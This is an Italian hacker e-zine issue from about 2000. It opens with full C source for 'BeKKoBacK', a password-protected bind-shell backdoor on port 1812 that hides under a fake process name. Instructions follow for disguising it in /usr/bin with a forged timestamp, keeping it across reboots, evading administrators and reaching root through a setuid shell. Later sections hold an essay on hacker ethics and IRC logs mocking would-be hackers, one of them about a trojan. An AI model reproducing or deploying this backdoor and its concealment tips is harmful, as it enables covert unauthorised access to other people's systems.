#include <stdlib.h>
#include <errno.h>
#include <unistd.h>
#include <netdb.h>
#include <time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/wait.h>
#include "header.h"

#define PORT 1812
#define PASSWD "afacci"

main(argc, argv)
  int argc;
  char **argv;
{
  int soc_des, soc_cli, soc_rc, soc_len, server_pid, cli_pid;
  struct sockaddr_in serv_addr;
  struct sockaddr_in client_addr;
  int i, k, j, argvlen;
  char *bfiargv[argc+1];
  char *fintops = CIAO_PS ;
  char buffer[15];
  
  if (argc < 2) {
    printf("Usage: %s fakeps\n",argv[0]);
    return 30;
  }

  for(i=0; i < argc; i++) {
    bfiargv[i] = malloc(strlen(argv[i]) + 1);
    strncpy(bfiargv[i], argv[i], strlen(argv[i]) + 1);
   }
  bfiargv[argc] = NULL;
  argvlen = strlen(argv[0]);
  if (argvlen < strlen(bfiargv[1])) {
    printf("Se vuoi fregare davvero ps vedi di lanciarmi almeno come superFunKyTrUnKy ! \n") ;
    abort();
  }

  fintops=bfiargv[1] ;
  strncpy(argv[0], fintops, strlen(fintops));
  for(i = strlen(fintops); i < argvlen; i++) argv[0][i] = '\0';
  for(i=1; i < argc; i++) {
    argvlen = strlen(argv[i]);
    for(j=0; j <= argvlen; j++)
      argv[i][j] = '\0';
   }

       soc_des = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (soc_des == -1)
        exit(-1);
    bzero((char *) &serv_addr, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = htonl(INADDR_ANY);
    serv_addr.sin_port = htons(PORT);
    soc_rc = bind(soc_des, (struct sockaddr *) &serv_addr,
sizeof(serv_addr));
    if (soc_rc != 0)
        exit(-1);
    if (fork() != 0)
        exit(0);
    setpgrp();
    signal(SIGHUP, SIG_IGN);
    if (fork() != 0)
        exit(0);
    soc_rc = listen(soc_des, 5);
    if (soc_rc != 0)
        exit(0);
    while (1) {
        soc_len = sizeof(client_addr);
        soc_cli = accept(soc_des, (struct sockaddr *) &client_addr,
&soc_len);
        if (soc_cli < 0)
            exit(0);
        cli_pid = getpid();
        server_pid = fork();
        if (server_pid != 0) {
            dup2(soc_cli,0);
            dup2(soc_cli,1);
            dup2(soc_cli,2);
  	      for (k=0;k<15;k++) {
               buffer[k] = '\0';
            }
            send(soc_cli, "Password:", 9, 0);
            readline(soc_cli, buffer, sizeof(buffer));
            buffer[(strlen(buffer)-2)] = '\0';
            if (strcmp(buffer, PASSWD) != 0) {
               send(soc_cli, "Password Errata\n", 16, 0);
               close(soc_cli);
               exit(0);
            } 
            system("/bin/sh -i");
            close(soc_cli);
            exit(0);
        }
    close(soc_cli);
    }
system("echo Worked!");
}
----------------------------------------------------------------------
End Here				BeKKoBacK.c
----------------------------------------------------------------------

Qui bisogna solo dire che cambiando il numero di porta di #define PORT 1812
potrete specificarne una diversa a cui telnettare per rendere attiva la
vostra backdoor, mentre con #define PASSWD "afacci" potreste (volendo)
specificare una password diversa di quella messa tra virgolette. 

Il file header.h allegato sotto dovrà essere messo nella stessa
directory di BeKKoBacK.c quando lo compilerete. Il contenuto di tale
file è stato preso da Unix Network Programming Volume I e riguarda 
una funzione (readline) che legge una stringa di testo da un descrittore. Se 
volete potete anche usare assieme alla funzione "send" anche "recv"; in tal 
caso header.h non vi servirà più.

---------------------------------------------------------------------
Begin Here				header.h
---------------------------------------------------------------------
#include <fcntl.h>
#include <errno.h>

ssize_t
readline(int fd, void *vptr, size_t maxlen)
{
	ssize_t n, rc;
	char      c, *ptr;

	ptr = vptr;
	for (n = 1; n < maxlen; n++) {
		again:
		     if ( (rc = read(fd, &c, 1)) == 1) {
			*ptr++ = c;
			if (c == '\n')
			     break;
		     } else if (rc == 0) {
			if (n == 1)
			     return (0);
		                else
			     break;
		     } else {
			if (errno = EINTR)
			     goto again;
			return (-1);
		     }
	}
	
	*ptr = 0;
	return (n);
}
---------------------------------------------------------------------
End Here				header.h
---------------------------------------------------------------------

			[ IDEE PER BEKKOBACK.C ]

Adesso cercherò di illuminare la piccola mente di qualcuno. Durante l'articolo
abbiamo detto che se eseguiamo un file il suo nome apparirà tra la lista
dei processi... quindi se dalla home del nostro utente bucato eseguiamo
"./scannerip" ciò è esattamente quello che apparirà nel ps. A questo punto
cosa farà il root? Beh, naturalmente un semplice find, scoverà il nostro file
ed in parole povere saremo stati scoperti (e spesso in questi casi anche 
tagliati fuori dal sistema). Abbiamo visto come possiamo troianizzare in modo
semplice questo comando, però abbiamo bisogno dei privilegi di root che spesso
saranno desiderati (ma non per questo dominati) come una Megan Gale nuda.
Tuttavia esiste BeKKoBacK, una backdoor tutto sommato semplice. Vi sono
poche righe di codice che ci permettono di nascondere BeKKoBacK come
"elm", "in.ident" e quant'altro volete. Tutto ciò senza avere i privilegi di
root. Certo se non siete root dovrete cercare di limitare l'utilizzo dei nomi
dei demoni dato che questi girano spesso come root, quindi l'amministratore
potrebbe meravigliarsi di avere tra il ps un demone del samba (smbd) che
gira con i privilegi di un utente normale... beh quantomeno si insospettirebbe;
potrebbe killare il processo, ma un find qui non servirà a nulla, dato che
il nome del processo non corrisponderà a quello del file eseguito. Tuttavia,
da utenti normali una volta installata questa backdoor nel sistema, non 
potrete rientrare con i privilegi di root, bensì con i privilegi di chi 
ha eseguito tale file. Ciò sta a significare che se la macchina va in reboot,
la vostra backdoor non sarà più usufruibile e dovrete rieseguirla manualmente.

Le condizioni ottimali quindi per usare questo codice rimangono sempre da root.
Avendo infatti uid e gid 0 potrete far riavviare la backdoor ogni volta che
la macchina rebootta (naturalmente dovrete sapere dove mettere le mani), 
potrete nascondervi dal netstat (cosa che non potete fare da utenti normali)
ed inoltre i permessi del file eseguito saranno quelli del root e di conseguenza
potrete fare apparire nella lista dei processi qualsiasi nome di un demone.
Ricordatevi inoltre che se siete root potreste dare un chmod +s nomebackdoor
in modo da renderla eseguibile anche da parte degli utenti normali (così
non dovrete per forza agire con i privilegi del massimo utente). Per quanto
riguarda il nome da dare a BeKKoBacK una volta compilato, seguite questo
consiglio. Entrate nella directory /usr/bin e cercate un file strano
(come scpb) che possibilmente non sarà mai eseguito dal root (che probabilmente
non saprà nemmeno a cosa serva); a questo punto rinominate BeKKoBacK come
scpbmacro, gli mettete una data accettabile attraverso il comando touch in
conformità a tutti i file presenti su /usr/bin e lo copiate in quella directory.

Non è un consiglio molto intelligente, ma vi assicuro che non sono molti i root
che tengono un archivio dei file presenti nel sistema o che utilizzano
programmi come o migliori del semplice sum.

Un altro consiglio che potrei darvi è quello di modificare con chown i permessi
della backdoor in nobody ed eseguirla come ./nomebackdoor [httpd]. A questo
punto copiate una shell suidata da qualche parte nell'hard disk della vittima
e quando telnettate alla porta 1812 e scrivete la vostra password sarete
dentro con i permessi di nobody, quindi andrete ad eseguire la shell
suidata e sarete root. L'amministratore del sistema non sospetterà minimamente 
del processo, dato che normalmente questi girano come nobody.

Se non faccio esempi pratici di ciò è perchè voglio
che siate voi a sbattere il grugno sulla vostra macchina. Se conoscete poco
linux vi ricordo sempre che i man esistono, ed anche discreti manuali
in italiano presso le librerie (semmai non digeriste l'inglese).

Mi rendo conto che forse questo articolo per molti sarà elementare, per altri
invece molto difficile e mi rendo conto che avrei potuto continuare a sbattere
il grugno su Oracle anzichè stritolarvi le palle con questo issue; cmq
il tempo e la pratica vi faranno cambiare idea. Probabilmente a molti non dirà
niente leggere questo articolo oggi, ma tra qualche mese, acquisita un pò
di pratica e di conoscenza in più, vi sembreranno cose scontate ed affascinanti
allo stesso tempo. Purtroppo si tratta pur sempre del primo numero di una
rivista che (come daltronde tutte quelle che nascono) non hanno un futuro
certo e che hanno bisogno di crescere e migliorare. La mia e-mail la conoscete,
il mio modo di fare e di pensare (semmai verrano allegati tutti e quattro
gli articoli che ho consegnato) pure; adesso serve solo il vostro
impegno e quello mi dispiace non posso darvelo perchè talvolta il tedio
sopprime anche me (vedi nel dizionario la parola innamorarsi :) 

Adesso smetto. Alla prossima.


Fulgidi Ringraziamenti vanno a:

				* Le discoteche al mare aperte d'estate
				* Chi me l'ha data senza farmela patire 
				    nell'ancora breve corso della mia vita
				* Ai seni ben portati
				* ...e a tutte le ragazze che in questa
				    estate acconsentono ed hanno acconsentito 
                            alla mia corte :D

Credo di aver terminato.

[nasa /tmp]# telnet orzobimbo.mil 1812
Connecting to orzobimbo.mil ...
Password: [insert here your password]
bash# exit
Connection closed by foreign host.
(vai in discoteca ogni tanto zombie!!!)


MeTal Up YoUr AsS !!!


									By ][^XaBaRaS^][

= **************************************************************************** =
= ================================ [ THE END ] =============================== =
= **************************************************************************** =
 

= **************************************************************************** =
=======================[ PENSIERI: LA NUOVA TELENOVELA ] =======================
= **************************************************************************** =

Autore : ][^XaBaRaS^][ 
Pensiero del giorno: Inutile che mi cercate su IRCNet per riempirmi il cranio
                     di puttanate quale il sistema, l'etica o la netiquette, io
                     scrivo solo ciò che sento di scrivere, tanto anche se mi
                     cercate tutte le 13 lettere del mio nick non entrano 
	               nel nefasto comando NICK :D

Benvenuti alla prima puntata di pensieri... quest'oggi il vostro eroe
telenoveliano (che cazzo di neologismo) vi presenta la sua parte più oscura:
la PARANOIA!!!

Queste considerazioni mi sono venute in mente in una calda e desolata notte di
giugno, quando sei solo tu ed il computer... quando hai perso la tua lei da
tanto tempo (o nel caso delle femminucce il tuo lui) e la pensi ancora... e
quando arrivano quelle notizie che ti fanno riflettere: ma porca puttana ed
io ho rovinato 11 mesi della mia vita per cotanta troia??? :D (nel caso
femminile per codesto stronzo)... e ad un certo punto rifiorisci e sei
libero di pensare senza inzuppare di cazzate allucinoggene quel diario segreto
elettronico (il tuo editor di testi preferito) nel quale la osannavi e la
ricordavi come la maria scesa in terra che scialacquava amore e bontà
dappertutto. Ok a parte gli scherzi (meno male che per più di 4 mesi non sono
stato male per una donna) spesso scrivo riflessioni del genere, e tali rimangono 
e rimarranno sul mio hard disk per tutta la vita, altre volte le faccio leggere
o le do in mano a riviste informatiche come Security System (beh... questa 
veramente è la prima volta :) Vorrei comunque che leggeste il tutto con molta 
attenzione, non sono certamente bello, non avrò le conoscenze di Kevin Mitnick 
(e questo è sicuro al miliardo per cento), però se proprio non volete guardare 
al messaggero, guardate al messaggio. Iniziamo con la telenovela (PS. Si tratta
di un monologo dantesco non di un botta e risposta :)

---begin here---
A volte penso ...
Beh capita a tutti gli esseri che hanno almeno un pizzico di vita cerebrale 
all'interno del cranio ... ma io ho una quantità troppo intensa di pensieri. 
Da poco tempo a questa parte mi sto realmente addentrando nei confini ignoti 
alla ricerca dell'hackerdom, un qualcosa che quando l'hai raggiunto si fa 
acciuffare per poi riscappare, scivolare veloce fra le mani. Come diceva e 
dice Fusys (e spero mi perdonerà pur se lo sto tirando in ballo in questo modo)
l'hackerdom è una ricerca continua ... non c'è verso di dominarlo 
per sempre, ed anche se mi occupo di sikurezza, di hacking, misc-ing e boiate 
varie da qualche anno, solo adesso comincio a "ragionare" e vedere tutto in 
una luce meno dark ma non per questo meno cool. Sono indotto a pensare che tutto
quello che si dice in giro degli hacker sulla grande madre rete o in TV siano
tutte pippate. Non sono mica gli hacker che parlano di loro ... "mi" e "ci" è 
stato  insegnato che questi esperti informatici, il terrore dei governi e delle
grandi potenze mondiali, non dicono mai di esserlo, agiscono in silenzio, non 
creano danni alle cose, alle persone ed ai sistemi, e che se si aggirano per 
siti porno nessuno dei chatters presenti su #sex o su 
#megangalemelasparamano sapranno mai della loro presenza nei paraggi. 

... allora sono indotto a pensare che i ragazzini grandi o piccoli,
cresciuti o meno, che attaccano sistemi, bramosi di shell da cui lanciare 
attacchi, agganciare bot, sniffer, kernel hAck-on e tutto ciò che volete, 
facciano confusione tra cracker e hacker. Ma Dio bit, non sono solamente 
gli stranissimi personaggi 3l1t3, c00l, ^Myn|ck|\|4M3^(c) più o meno 
preparati della scena underground che agiscono nel modo menzionato sopra... 
ma anche i GRANDI, coloro che in questo momento hanno più conoscenza 
di 1000 XaBaRaS messi assieme. Scoprono delle vulnerabilità e lasciano 
ignari milioni e milioni di utenti, migliai di amministratori nel buio più 
totale, almeno fino a quando qualcun'altro scopre successivamente gli hole 
e li rende pubblici, per poi andare a dire: "io c'ero arrivato molto tempo 
prima". E queste parole non sono dette a caso dopo vicende del genere 
accadute anche (e soprattutto) negli ultimi periodi (giugno 2000). 
Ma allora chi cazzo 
sono gli hacker?? C'è confusione ... penso che anche quelli veri, 
quei pochi, non stiano capendo una mazza in questo periodo dell'informazione 
confusionaria, malgestita e imbastita a mò di cazzo di cane per darla in pasto 
ai bramosi "utenti". Ma azzolina dico io, se l'hacker agisce di nascosto è
o meno eticamente corretto avvertire chiunque della scoperta dei bug che 
minano i prodotti ed i servizi informatici? Questo benedetto cristiano, ateo,
musulmano, sataniano o buffoniano che sia, deve rendere pubblico ciò
che scopre o meno? Gridiamo allo scandalo quando succeddono fatti come
quello delle vulnerabilità di MailStudio2000 che certi conoscevano già
da parecchio tempo prima, però diciamo che gli hacker, quelli veri, sono
magnanimi e si fanno gli affar propri. Restando sempre nei paraggi 
di questo discorso ... è anche giusto contrastare i colossi economici 
che vanno come vichinghi alla conquista della rete, subbissandoli di DoS 
distribuiti per lasciarli in agonia ore o addirittura week-end interi?

Chi è qui Attila il distruttire, il flagello di Dio e chi
invece la grande Roma punitrice dei torti e dei barbari? Chi è il buono
ed il cattivo? Il bello ed il brutto? (dato che in questa società siamo
stati abituati a vedere tutto in quest'ottica paradossale) ... non capendo 
tuttora a che cazzo di gioco si sta giocando (forse lo capirò quando 
agguanterò appena per qualche secondo l'hackerdom ... ma dovrà passarne 
di tempo) posso solamente pensare che ci sia una cosa UNICA certa e sicura: 
l'hacker è colui che sfonda i sistemi, niente di più e niente di meno, 
niente confronti con cracker o hardware-isti che si costruiscono modem
a 56600 bps con i pezzi di scarto di un forno a microonde ... 
solo bit contro bit niente di più.
--- end here---


Ringraziamenti: Naggia quando scrissi questa considerazione (giugno 2000)
                non c'era nessuno che riempiva la mia vita quindi chi potrei 
                salutare?? Beh pensandoci bene nemmeno ora (fine luglio 2000)
                c'è una lei che la riempie... quindi per stavolta vi risparmio 
                pietosi saluti.
Adios


Metal Up Your Ass!!!

= *************************************************************************** =
= ================================ [ THE END ] ============================== =
= *************************************************************************** =

= *************************************************************************** =
= ===============================I LOG DI IRC================================ =
= ===========================INCONTRI: PARTE PRIMA=========================== =
= *************************************************************************** =


               --== Discussione tra AsM e un vero hacker ==--

<XXXX> ciao
<AsM> ciao
<XXXX> se c'è una cosa che non sopporto sono i LAMER
<AsM> già sono daccordo con te...
<XXXX> Ne ho beccato appena uno
<AsM> Wao bravissimo ;)
<AsM> ma per beccato che intendi?
<XXXX> sono entrato dentro il suo computer
<AsM> allora sei un hacker?
<XXXX> si
<AsM> wao hacker.... io non ho mai conosciuto un hacker
  ( ehhehehehehe :) )
<AsM> ma usi Linux allora?
<XXXX> no non c'è bisogno uso un programma sotto windows
<AsM> ahh, beh io non so molto spiega spiega...
<XXXX> beh se vuoi te lo invio dammi l'e-mail
<AsM> Ma non me lo puoi inviare via DCC?
<XXXX> 10Mb?
<AsM> azz eheheh, io ho l'e-mail da freemail
<AsM> e gestisce solo 1Mb di spazio.
<AsM> e allora come facciamo?
<XXXX> non so!!!
<AsM> non puoi metterlo temporaneamente on-line in modo
<AsM> che lo possa scaricare?
<XXXX> No lo potrebbero usare contro di noi.
<AsM> ahh, capito quindi è molto pericoloso?
<XXXX> si
<AsM> uhm ma mica è uno di quei trojan del cavolo?
<XXXX> NO
<AsM> ma per entrare nei computer degli altri di cosa
<AsM> c'è bisogno?
<XXXX> di nulla...
<AsM> cioè vuoi dire che solamente con il suo Ip si ci
<AsM> può entrare dentro...
<XXXX> si proprio così
<AsM> wao ottimo
<XXXX> senti io devo andare
<AsM> allora come rimaniamo?
<XXXX> senti ti lascio il mio cell e ci mettiamo daccordo
<XXXX> 0339XXXXXXX e il tuo?
<AsM> beh mica posso dare numeri di telefono a tutti
<AsM> quelli che incontro...
<AsM> in caso ti telefono io ok?
<XXXX> ok
<AsM> senti un'ultima domanda?
<XXXX> si veloce però che devo andare
<AsM> si
<AsM> ma questo programma mica hackera i server
<AsM> che anno la porta 21 aperta? o qualcosa del genere...
<XXXX> che cosè la porta 21?
<AsM> ah ok ok ehehhhe ho capito tutto...
<AsM> ciao ciao
<XXXX> che hai capito?
<AsM> niente niente...
<XXXX> Dimmelo!!!


Questo è quello che mi è successo, è stata davvero una bella esperienza
incontrare un vero hacker che non sa neanche cosa è la porta 21 di un
server ehheheheheheh, e meno male che non gli piacevano i LAMER ;)
_______________________________________________________________________


                      --== Zeppo programmatore Doc ==--

<AsM> -Zeppo- DCC Send BOSERVE.EXE (212.216.75.162)
<AsM> -
<AsM> DCC Send  da  Zeppo respinta (file type ignora)
<AsM> -
<AsM> che significa?
<Zeppo> Era un giochino!
<Zeppo> Mi acimmio in programmazione!
<Zeppo> Mi scimmio in programmazione!, scusa
<AsM> è un programma che hai fatto tu?
<Zeppo> si, uno di quei giochini stupìdi
<Zeppo> un passatempo
<AsM> forte
<AsM> mi piace
<Zeppo> si, aspiro a fare qualcosa di + (Half life, o roba del genere)
<Zeppo> però ora so fare solo questo!
<AsM> perchè si chiama boserve
<Zeppo> Nulla, è il nome che ha messo un mio amico di nome Bo'
<AsM> ma occupa molto
<AsM> senti me lo invieresti
<AsM> ?
<Zeppo> No, neanche 150 Kb, te lo detto che è una cavolata!
<AsM> inviamelo
<AsM> così vedo comè
<Zeppo> ok, provatelo, l'ho fatto con Visual Basic 5 Pro
<AsM> inviamelo
<AsM> ci sei?
<Zeppo> ehi!
<AsM> si
<AsM> allra
<AsM> me lo invii
<Zeppo> son caduto un'attimo, cavolo di connessioni!
<Zeppo> ok, un attimo
<AsM> ok mi sta arrivando
<Zeppo> arriva, va!
<AsM> sono emozionato
<Zeppo> ehi, non esagerare, al massimo un sorriso ci scappa
<AsM> è arrivato wao
<AsM> troppo forte
<Zeppo> va'?
<AsM> adesso che devo fare?
<Zeppo> penso eseguirlo
<AsM> si lo faccio subito
<Zeppo> prova
<AsM> lo eseguo ora?
<Zeppo> ma si! Tanto non ci vuole un accelleratore grafico
<AsM> ok
<AsM> ehi 
<AsM> ma quì non si vede nulla
<AsM> che devo fare
<AsM> lo devo configurare?
<AsM> ehi che è successo?
<AsM> ci sei?
<Zeppo> ma non ti va'?
<AsM> non si vede nulla
<AsM> l'ho eseguito ma non fa nulla
<Zeppo> magari mancano delle dll
<AsM> che devo fare
<Zeppo> bo'
<Zeppo> ...
<AsM> allora che devo fare?
<Zeppo> non lo so' da me va'!
<AsM> vabbe
<AsM> io vado
<AsM> ciao
<AsM> devo andare grazie lo stesso
<Zeppo> te ne vai?
<AsM> si
<AsM> cmq
<AsM> ti avverto che ho loggato tutto
<AsM> e questa
<AsM> query sarà messa nella rivista Security System.
<AsM> con te zeppo programmatore doc
<Zeppo> cosa?
<AsM> hahahahahaha
<Zeppo> eh?
<AsM> ciao ci vediamo
<AsM> e grazie di tutto
<Zeppo> ciao!
<AsM> Hai incontrato la persona sbagliata!!!
<AsM> Che lamer che sei però...
<AsM> ;)
*** Zeppo (beppenet@a-to8-46.tin.it) Quit (Ping timeout)
 ehhehehe...

Quello che posso dire è che ero talmente emozionato di aver conosciuto
un vero programmatore di giochi che non sapevo cosa dirgli, non avevo
mai conosciuto un programmatore che invia il file BOSERVE.EXE (è un 
trojan) e dice che è un programma fatto da lui che LAMER!!! arhg che 
nervi non sopporto quando si deve prendere in giro la gente...
_______________________________________________________________________


                --== Come diventare IRCop con una DLL ==--

Session Avvio: Wed Jun 14 00:38:51 2000
Session Ident: ^Vicious^ (promirc@ppp-155-14.25-151.libero.it)
<^Vicious^> sei ircop?
<AsM> si nota?
<^Vicious^> lo sei?
<AsM> perchè ti interessa saperlo?
<^Vicious^> perche vorrei il dll per diventare un ircop
<AsM> io ho l'esegutivo
<^Vicious^> cioe?
<AsM> si un programma
<AsM> per diventare ircop
<AsM> non uso dll
<AsM> non mi piacciono
<^Vicious^> non mi freghi ciccio i viruzzoli tienli x te
<AsM> uhm ok
<AsM> dovrei avere la dll da qualche parte
<AsM> però
<AsM> non so se te la posso mandare
<^Vicious^> xche?
<AsM> beh
<AsM> è un segreto mica posso dirlo a tutti
<^Vicious^> ??????
<AsM> Cmq senti dovresti chiedere l'autorizzazione.
<^Vicious^> Autorizzazione??? e da chi?
<AsM> Devi telefonare al 119.
<AsM> Di che ti mando io e se ti posso dare il dll.
<^Vicious^> al 119??? ma non è il servizio per i clienti TIM???
<AsM> si ma anche per IRC e le chat non lo sapevi???
<^Vicious^> NO!!! DAVVERO???
<AsM> e certo, secondo te come ho fatto a diventare IRCop ehehehehe
<^Vicious^> ok grazie mille... vado a fare subito ;-) ciao...
<AsM> Di nulla.
<AsM> ciao...
Session Chiusa Wed Jun 14 00:55:33 2000



Beh mica posso dare a tutti il dll, vi immaginate una rete piena di
IRCop???
Comunque spero che sappiate che per diventare IRCop non c'è bisogno di
nessun dll o exe, ci vuole solo una o-line data da un'ADMIN di un
server IRC.


= *************************************************************************** =
= ================================ [ THE END ] ============================== =
= *************************************************************************** =

= *************************************************************************** =
= ===================================CONCLUSIONI ============================ =
= *************************************************************************** =

Bene, bene...finalmente è finita!!! Siamo arrivati alla conclusione del primo
numero di Security System. Che dire...vi è piaciuta? Vi siete rotti i pallun?
Vi siete fatti tante di quelle canne per riuscire a leggerla tutta? Si poteva
far meglio? Insomma esprimete le vostre impressioni, i vostri giudizi, le vostre
critiche, le vostre bestemmie....ma fateci sapere qualcosa. Qualcosa che ci 
spinga ad andare avanti o a darci al gioco delle bocce sulla spiaggia con qualche
arzillo vecchietto.
Sicuramente c'è ancora molto da migliorare, da aggiungere ma questa è un'altra storia.
Una nota di merito particolare va al caro Xabaras: senza di lui non saremmo usciti
neanche con il numero 1..][grazie Xabino][. Purtroppo, come in tutte le opere ci sono
disguidi iniziali che possono essere superati e rendere più solida e superba l'opera ...
ma possono segnare anche la fine dell'inizio. A noi cosa ci aspetterà?
Il numero 2 o l'oblio (OBLIO! OBLIO!)BOOOOOOOO....Onestamente noi ci abbiamo provato...
ora spetta a Voi! 
Un saluto da Security System...o un addio???
eheheheheheh


            ______________________________________________________
           |  __________________________________________________  |
           | |                                                  | |
           | |        Copyright Security System    1999-2000    | |
           | |                                                  | |
           | |            IRC:  irc.musichat.net                | |
           | |                  irc.tin.it                      | |
           | |            CHAN:  #ssystem                       | |
           | |	                                                | |
    	   | |     E-MAIL: security_system@weedmail.com         | |
           | |                                                  | |
           |  ¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯  |
            ¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯
